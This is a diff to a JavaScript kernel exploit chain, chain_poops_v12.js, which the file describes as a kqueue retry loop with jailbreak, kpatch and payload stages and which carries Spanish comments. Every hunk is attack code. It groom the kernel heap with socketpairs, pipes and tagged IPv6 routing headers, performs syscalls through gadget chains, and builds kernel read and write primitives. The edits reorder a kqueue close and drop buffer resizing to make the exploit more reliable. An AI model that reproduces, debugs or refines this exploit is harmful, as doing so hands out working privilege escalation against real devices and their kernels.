@@ -1,4 +1,4 @@
-// chain_poops_v11.js — loop de reintentos de kqueue + jailbreak + kpatch + payload
+// chain_poops_v12.js — NO cerrar el kqueue antes de probar candidatos
 import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
@@ -85,7 +85,7 @@ function check(name, ok, detail) {
     try {
         if (window.__TM) {
             window.__TM.diagnostics[name] = ok ? 'PASS' : 'FAIL';
-            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v11.js', line: 0, col: 0, stack: '' });
+            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v12.js', line: 0, col: 0, stack: '' });
             if (window.__TM.render) window.__TM.render();
         }
     } catch (e) { }
@@ -298,7 +298,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             c.stackU8.fill(0); c.frameU8.fill(0);
             const insts = [];
             for (let i = 0; i < args.length; ++i) {
-                if (!argGadget[i] || typeof argGadget[i].low !== "number") throw new Error("layout: arg[" + i + "] no int64");
+                if (!argGadget[i] || typeof argGadget[i].low !== "number") throw new Error("layout: arg[" + i + "]");
                 insts.push(argGadget[i]); insts.push(args[i]);
             }
             const targetIdx = insts.length;
@@ -416,11 +416,8 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("uio socketpair failed");
         const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
 
-        lenDv.setUint32(0, 0x4000, true);
-        const uioSnd = sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4).i32;
-        const uioRcv = sc(SYS.setsockopt, uioSs[0], SOL_SOCKET, SO_RCVBUF, lenAddr, 4).i32;
-        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(",")
-            + " SO_SNDBUF rc=" + uioSnd + " SO_RCVBUF rc=" + uioRcv);
+        // Sin setsockopt grandes (evita fragmentar el heap del kernel)
+        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(",") + " (sin setsockopt)");
 
         if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
         const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
@@ -564,7 +561,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             return w.rpc("fire", timeoutMs === undefined ? 3000 : timeoutMs, w.ctx.S.low, w.ctx.S.hi);
         }
 
-        // race + triplets (mantener el bloque de v10/v9)
         function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
         function readTag() {
             const v = leakDv.getUint32(4, true) >>> 0;
@@ -619,7 +615,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             return 0;
         }
 
-        // boot fingerprint
         const nameAb = new ArrayBuffer(8), outAb = new ArrayBuffer(0x10);
         keepAlive.push(nameAb, outAb);
         const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
@@ -810,9 +805,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 new Uint8Array(ab).fill(0x41);
                 return { ab: ab, addr: bufAddr(ab), dv: new DataView(ab) };
             });
-            lenDv.setUint32(0, 0x4000, true);
-            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
-            sc(SYS.setsockopt, uioSs[0], SOL_SOCKET, SO_RCVBUF, lenAddr, 4);
             sc(SYS.write, uioSs[1], scratch, Math.min(size * (uioWorkers.length + 4), 0x800));
             put(uioIovDv, 8, size);
             const utasks = new Array(uioWorkers.length);
@@ -839,9 +831,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             if (kreadPoisoned) return false;
             if (!kaddrOk(dst) || !tripletsUsable()) return false;
             mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
-            lenDv.setUint32(0, 0x4000, true);
-            sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
-            sc(SYS.setsockopt, uioSs[0], SOL_SOCKET, SO_RCVBUF, lenAddr, 4);
             sc(SYS.write, uioSs[1], scratch, Math.min(size * (uioWorkers.length + 4), 0x800));
             put(uioIovDv, 8, size);
             const utasks = new Array(uioWorkers.length);
@@ -937,9 +926,13 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 }
                 mark("KARW-CANDIDATES", candidates.length + " candidatos");
 
-                sc(SYS.close, kqFdLocal);
+                // *** FIX v12: refindear triplets ANTES de probar (spray los movió) ***
                 triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
-                if (!triplets[2]) { mark("KARW-TRIPLET-LOST", "intento=" + karwAttempt); break; }
+                if (!triplets[2]) {
+                    mark("KARW-TRIPLET-LOST", "intento=" + karwAttempt);
+                    sc(SYS.close, kqFdLocal);
+                    break;
+                }
 
                 let fdtOfiles = null, fdtOff = -1, consecutiveFails = 0;
                 for (const cand of candidates) {
@@ -950,6 +943,15 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     if (v && kaddrOk(v)) { fdtOfiles = v; fdtOff = cand.off; mark("KARW-FDT-FOUND", "off=0x" + cand.off.toString(16) + " -> " + v); break; }
                     consecutiveFails++;
                     mark("KARW-FDT-ZERO", "off=0x" + cand.off.toString(16) + " val=" + v);
+                }
+
+                // *** FIX v12: cerrar el kqueue DESPUÉS de probar candidatos ***
+                sc(SYS.close, kqFdLocal);
+
+                // *** Y refindear triplets después del close ***
+                if (!refindPair("KC")) {
+                    mark("KARW-TRIPLETS-LOST-AFTER-CLOSE", "intento=" + karwAttempt);
+                    break;
                 }
 
                 if (!fdtOfiles) {
